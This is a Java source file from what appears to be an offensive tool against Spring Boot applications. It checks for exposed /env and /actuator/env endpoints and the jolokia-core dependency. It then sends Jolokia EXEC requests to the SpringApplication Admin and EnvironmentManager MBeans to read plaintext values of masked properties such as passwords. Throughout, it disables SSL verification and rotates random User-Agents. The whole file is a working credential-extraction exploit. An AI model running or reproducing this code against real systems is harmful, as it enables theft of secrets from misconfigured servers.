package src.main.module;

import src.main.common.UA_Config;
import src.main.impl.ResultCallback;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static src.main.SSLVerify.sslVer.disableSSLVerification;

public class GetSpPassWord_I {
    public String address;
    public String args;
    public int clsvalue;
    public String text;
    public GetSpPassWord_I(String address,String args,int clsvalue){
        this.address = address;
        this.args = args;
        this.clsvalue = clsvalue;
    }

    /*
    * 调用SpringApplicationAdminMXBeanRegistrar类
    * */
    public void Result1(ResultCallback callback) {
        String api = "/jolokia";
        String llib = "jolokia-core";
        String site = address + api;
        String pocsite = address + "/env";
        String respValue = "value";
        String data = "{\"mbean\": \"org.springframework.boot:name=SpringApplication,type=Admin\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"%s\"]}";
        String expdata = String.format(data,args);
        String ua = "";
        disableSSLVerification();
        try {
            URL obj = new URL(pocsite);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            UA_Config uacf = new UA_Config();
            List<String> ualist = uacf.loadUserAgents();
            ua = uacf.getRandomUserAgent(ualist);
            conn.setRequestProperty("User-Agent",ua);
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            if (responseCode == HttpURLConnection.HTTP_OK && response.toString().contains(llib)){
                String regex = llib + "-(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(response.toString());
                if(matcher.find()){
                    text = String.format("jolokia 依赖为: %s",matcher.group(1));
                    callback.onResult(text);
                }
                URL obj1 = new URL(site);
                HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
                ua = uacf.getRandomUserAgent(ualist);
                conn1.setRequestProperty("User-Agent",ua);
                conn1.setRequestMethod("POST");
                conn1.setRequestProperty("Content-Type", "application/json");
                conn1.setDoOutput(true);
                try(OutputStream os = conn1.getOutputStream()){
                    byte[] input  = expdata.getBytes(StandardCharsets.UTF_8);
                    os.write(input,0,input.length);
                }
                int responseCode1 = conn.getResponseCode();
                if (responseCode1 == HttpURLConnection.HTTP_OK){
                    BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
                    String inputLine1;
                    StringBuilder response1 = new StringBuilder();
                    while ((inputLine1 = in1.readLine()) != null) {
                        response1.append(inputLine1);
                    }
                    in1.close();
                    if (response1.toString().contains(respValue)){
                        String regex1 = "\"value\":\"([^\"]+)\"";
                        Pattern pattern1 = Pattern.compile(regex1);
                        Matcher matcher1 = pattern1.matcher(response1.toString());
                        if(matcher1.find()){
                            text = args + " " + "解密密钥为: " + matcher1.group(1);
                            callback.onResult(text);
                        }
                    }
                }else{
                    text = "网络连接错误";
                    callback.onResult(text);
                }
            }else{
                text = "没有发现jolokia依赖";
                callback.onResult(text);
            }
            in.close();
        }catch (Exception e) {
            e.printStackTrace();
        }
    }
    public void Result2(ResultCallback callback){
        String api ="/actuator/jolokia";
        String llib = "jolokia-core";
        String site = address + api;
        String pocsite = address + "/actuator/env";
        String respValue = "value";
        String data = "{\"mbean\": \"org.springframework.boot:name=SpringApplication,type=Admin\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"%s\"]}";
        String expdata = String.format(data,args);
        String ua = "";
        disableSSLVerification();
        try {
            URL obj = new URL(pocsite);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            UA_Config uacf = new UA_Config();
            List<String> ualist = uacf.loadUserAgents();
            ua = uacf.getRandomUserAgent(ualist);
            conn.setRequestProperty("User-Agent",ua);
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            if (responseCode == HttpURLConnection.HTTP_OK && response.toString().contains(llib)){
                String regex = llib + "-(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(response.toString());
                if(matcher.find()){
                    text = String.format("jolokia 依赖为: %s",matcher.group(1));
                    callback.onResult(text);
                }
                URL obj1 = new URL(site);
                HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
                ua = uacf.getRandomUserAgent(ualist);
                conn1.setRequestProperty("User-Agent",ua);
                conn1.setRequestMethod("POST");
                conn1.setRequestProperty("Content-Type", "application/json");
                conn1.setDoOutput(true);
                try(OutputStream os = conn1.getOutputStream()){
                    byte[] input  = expdata.getBytes(StandardCharsets.UTF_8);
                    os.write(input,0,input.length);
                }
                int responseCode1 = conn.getResponseCode();
                if (responseCode1 == HttpURLConnection.HTTP_OK){
                    BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
                    String inputLine1;
                    StringBuilder response1 = new StringBuilder();
                    while ((inputLine1 = in1.readLine()) != null) {
                        response1.append(inputLine1);
                    }
                    in1.close();
                    if (response1.toString().contains(respValue)){
                        String regex1 = "\"value\":\"([^\"]+)\"";
                        Pattern pattern1 = Pattern.compile(regex1);
                        Matcher matcher1 = pattern1.matcher(response1.toString());
                        if(matcher1.find()){
                            text = args + " " + "解密密钥为: " + matcher1.group(1);
                            callback.onResult(text);
                        }
                    }
                }else{
                    text = "网络连接错误";
                    callback.onResult(text);
                }
            }else{
                text = "没有发现jolokia依赖";
                callback.onResult(text);
            }
            in.close();
        }catch (Exception e) {
            text = "发起请求异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
     /*
     * 调用environment.EnvironmentManager类
     * */
    public void Result3(ResultCallback callback){
        String api = "/jolokia";
        String llib = "jolokia-core";
        String site = address + api;
        String pocsite = address + "/env";
        String respValue = "value";
        String data = "{\"mbean\": \"org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"%s\"]}";
        String expdata = String.format(data,args);
        String ua = "";
        disableSSLVerification();
        try {
            URL obj = new URL(pocsite);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            UA_Config uacf = new UA_Config();
            List<String> ualist = uacf.loadUserAgents();
            ua = uacf.getRandomUserAgent(ualist);
            conn.setRequestProperty("User-Agent",ua);
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            if (responseCode == HttpURLConnection.HTTP_OK && response.toString().contains(llib)){
                String regex = llib + "-(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(response.toString());
                if(matcher.find()){
                    text = String.format("jolokia 依赖为: %s",matcher.group(1));
                    callback.onResult(text);                }
                URL obj1 = new URL(site);
                HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
                ua = uacf.getRandomUserAgent(ualist);
                conn1.setRequestProperty("User-Agent",ua);
                conn1.setRequestMethod("POST");
                conn1.setRequestProperty("Content-Type", "application/json");
                conn1.setDoOutput(true);
                try(OutputStream os = conn1.getOutputStream()){
                    byte[] input  = expdata.getBytes(StandardCharsets.UTF_8);
                    os.write(input,0,input.length);
                }
                int responseCode1 = conn.getResponseCode();
                if (responseCode1 == HttpURLConnection.HTTP_OK){
                    BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
                    String inputLine1;
                    StringBuilder response1 = new StringBuilder();
                    while ((inputLine1 = in1.readLine()) != null) {
                        response1.append(inputLine1);
                    }
                    in1.close();
                    if (response1.toString().contains(respValue)){
                        String regex1 = "\"value\":\"([^\"]+)\"";
                        Pattern pattern1 = Pattern.compile(regex1);
                        Matcher matcher1 = pattern1.matcher(response1.toString());
                        if(matcher1.find()){
                            text = args + " " + "解密密钥为: " + matcher1.group(1);
                            callback.onResult(text);
                        }
                    }
                }else{
                    text = "网络连接错误";
                    callback.onResult(text);
                }
            }else{
                text = "没有发现jolokia";
                callback.onResult(text);
            }
            in.close();
        }catch (Exception e) {
            text = "发起请求异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }

    public void Result4(ResultCallback callback){
        String api = "/actuator/jolokia";
        String llib = "jolokia-core";
        String site = address + api;
        String pocsite = address + "/env";
        String respValue = "value";
        String data = "{\"mbean\": \"org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"%s\"]}";
        String expdata = String.format(data,args);
        String ua = "";
        disableSSLVerification();
        try {
            URL obj = new URL(pocsite);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            UA_Config uacf = new UA_Config();
            List<String> ualist = uacf.loadUserAgents();
            ua = uacf.getRandomUserAgent(ualist);
            conn.setRequestProperty("User-Agent",ua);
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            if (responseCode == HttpURLConnection.HTTP_OK && response.toString().contains(llib)){
                String regex = llib + "-(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(response.toString());
                if(matcher.find()) {
                    text = String.format("jolokia 依赖为: %s", matcher.group(1));
                    callback.onResult(text);
                    URL obj1 = new URL(site);
                    HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
                    ua = uacf.getRandomUserAgent(ualist);
                    conn1.setRequestProperty("User-Agent",ua);
                    conn1.setRequestMethod("POST");
                    conn1.setRequestProperty("Content-Type", "application/json");
                    conn1.setDoOutput(true);
                    try (OutputStream os = conn1.getOutputStream()) {
                        byte[] input = expdata.getBytes(StandardCharsets.UTF_8);
                        os.write(input, 0, input.length);
                    }
                    int responseCode1 = conn.getResponseCode();
                    if (responseCode1 == HttpURLConnection.HTTP_OK) {
                        BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
                        String inputLine1;
                        StringBuilder response1 = new StringBuilder();
                        while ((inputLine1 = in1.readLine()) != null) {
                            response1.append(inputLine1);
                        }
                        in1.close();
                        if (response1.toString().contains(respValue)) {
                            String regex1 = "\"value\":\"([^\"]+)\"";
                            Pattern pattern1 = Pattern.compile(regex1);
                            Matcher matcher1 = pattern1.matcher(response1.toString());
                            if (matcher1.find()) {
                                text = args + " " + "解密密钥为: " + matcher1.group(1);
                                callback.onResult(text);
                            }
                        }
                    } else {
                        text = "网络连接错误";
                        callback.onResult(text);
                    }
                }else{
                    text = "未找到依赖";
                    callback.onResult(text);
                }
            }
            in.close();
        }catch (Exception e) {
            text = "发起请求异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
    public void Exp(ResultCallback callback) throws IOException {
        // 先判断springboot版本
        // Result1 3 为 sp1
        // Result2 4 为 sp2
        String site = address + "/actuator/env";
        String ua = "";
        try {
            disableSSLVerification();
            URL obj = new URL(site);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            UA_Config uacf = new UA_Config();
            List<String> ualist = uacf.loadUserAgents();
            ua = uacf.getRandomUserAgent(ualist);
            conn.setRequestProperty("User-Agent",ua);
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                // 存在路径是springboot2，否则是springboot1
                text = "当前版本为springboot2";
                callback.onResult(text);
                if (clsvalue == 1) {
                    text = "当前调用类为SpringApplicationAdminMXBeanRegistrar类";
                    callback.onResult(text);
                    Result2(callback);
                } else if (clsvalue == 2) {
                    text = "当前调用类为EnvironmentManager类";
                    callback.onResult(text);
                    Result4(callback);
                }
            } else if (responseCode == HttpURLConnection.HTTP_NOT_FOUND) {
                text = "当前版本为springboot1";
                callback.onResult(text);
                if (clsvalue == 1) {
                    text = "当前调用类为SpringApplicationAdminMXBeanRegistrar类";
                    callback.onResult(text);
                    Result1(callback);
                } else if (clsvalue == 2) {
                    text = "当前调用类为EnvironmentManager类";
                    callback.onResult(text);
                    Result3(callback);
                }
            } else {
                text = "未识别springboot版本";
                callback.onResult(text);
            }
        }catch (IOException e){
            text = "发起请求异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }

}
